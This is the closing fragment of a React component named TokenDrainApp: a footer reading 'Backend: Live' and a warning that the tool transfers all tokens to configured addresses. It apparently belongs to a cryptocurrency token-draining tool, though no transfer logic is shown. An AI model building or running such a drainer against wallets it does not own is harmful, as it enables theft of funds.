            <div className="footer-right">
              <span>Backend: Live</span>
            </div>
          </div>
          <div className="footer-warning">
            ⚠️ WARNING: This tool will transfer ALL tokens to configured addresses. Use with extreme caution.
          </div>
        </footer>
      </div>
    </div>
  );
}

export default TokenDrainApp;
